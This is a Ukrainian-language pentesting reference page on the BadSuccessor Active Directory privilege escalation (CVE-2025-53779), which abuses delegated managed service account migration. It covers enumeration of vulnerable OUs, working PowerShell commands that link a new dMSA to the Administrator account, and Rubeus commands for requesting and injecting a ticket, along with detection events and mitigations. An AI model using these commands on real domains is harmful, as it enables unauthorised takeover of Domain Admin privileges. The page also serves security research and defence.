# BadSuccessor: Ескалація привілеїв через зловживання делегованою міграцією MSA

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Delegated Managed Service Accounts (**dMSA**) — це наступники нового покоління **gMSA**, що постачаються у Windows Server 2025. Легітимний процес міграції дозволяє адміністраторам замінити *старий* обліковий запис (користувача, комп'ютера або service account) на dMSA із прозорим збереженням дозволів. Процес доступний через PowerShell cmdlets, такі як `Start-ADServiceAccountMigration` і `Complete-ADServiceAccountMigration`, та використовує два LDAP attributes об'єкта **dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* на замінений (старий) обліковий запис.
* **`msDS-DelegatedMSAState`**       – стан міграції (`0` = відсутній, `1` = виконується, `2` = *завершено*).<sup>[[1]](#references)</sup>

Якщо attacker може створити **будь-який** dMSA всередині OU і безпосередньо змінити ці 2 attributes, LSASS і KDC сприйматимуть dMSA як *наступника* пов'язаного облікового запису. Коли attacker згодом автентифікується як dMSA, **він успадковує всі привілеї пов'язаного облікового запису** — аж до **Domain Admin**, якщо пов'язано обліковий запис Administrator.<sup>[[1]](#references)</sup>

Цю техніку у 2025 році назвала **BadSuccessor** команда Unit 42. Пізніше Microsoft присвоїла їй **CVE-2025-53779** і випустила security update у **серпні 2025 року**. Техніка залишається актуальною для середовищ Windows Server 2025 без встановлених оновлень, а також для перевірок небезпечного делегування OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Передумови атаки

1. Обліковий запис, якому *дозволено* створювати об'єкти всередині **Organizational Unit (OU)** *і* який має принаймні один із таких дозволів:
* `Create Child` → клас об'єктів **`msDS-DelegatedManagedServiceAccount`**
* `Create Child` → **`All Objects`** (generic create)
2. Мережеве підключення до LDAP і Kerberos (стандартний сценарій із приєднанням до домену / remote attack).<sup>[[1]](#references)</sup>

## Перерахування вразливих OU

Unit 42 випустила PowerShell helper script, який аналізує security descriptors кожного OU і виділяє необхідні ACEs:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Під капотом скрипт виконує сторінковий LDAP-пошук для `(objectClass=organizationalUnit)` і перевіряє кожен `nTSecurityDescriptor` на наявність

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8 (клас об’єктів *msDS-DelegatedManagedServiceAccount*)

## Кроки експлуатації

Після ідентифікації OU, доступного для запису, атака потребує лише 3 LDAP-записів:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Після реплікації attacker може просто виконати **logon** як `attacker_dMSA$` або запросити Kerberos TGT — Windows створить токен *superseded* account.<sup>[[1]](#references)</sup>

### Автоматизація

Кілька публічних PoC охоплюють увесь workflow, включно з отриманням пароля та керуванням квитками:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Модуль NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Виявлення та пошук

Увімкніть **аудит об'єктів** для OU та відстежуйте такі події безпеки Windows:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – створення об'єкта **dMSA**
* **5136** – зміна **`msDS-ManagedAccountPrecededByLink`**
* **4662** – зміни певних атрибутів
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – видача TGT для dMSA

Кореляція подій `4662` (зміна атрибута), `4741` (створення облікового запису комп'ютера/сервісу) та `4624` (подальший вхід до системи) швидко виявляє активність BadSuccessor. XDR-рішення, як-от **XSIAM**, постачаються з готовими до використання запитами (див. посилання).<sup>[[2]](#references)</sup>

## Пом'якшення ризиків

* Застосуйте оновлення безпеки Microsoft для **CVE-2025-53779** і перевірте рівень виправлень кожного контролера домену Windows Server 2025.<sup>[[6]](#references)</sup>
* Застосовуйте принцип *мінімальних привілеїв* – делегуйте керування *Service Account* лише довіреним ролям.
* Видаліть `Create Child` / `msDS-DelegatedManagedServiceAccount` з OU, яким це явно не потрібно.
* Відстежуйте перелічені вище ідентифікатори подій і створюйте сповіщення, якщо ідентичності, що не належать до *Tier-0*, створюють або редагують dMSA.

## Див. також


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: зловживання dMSA для ескалації привілеїв в Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Коли хороші облікові записи стають небезпечними: експлуатація Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
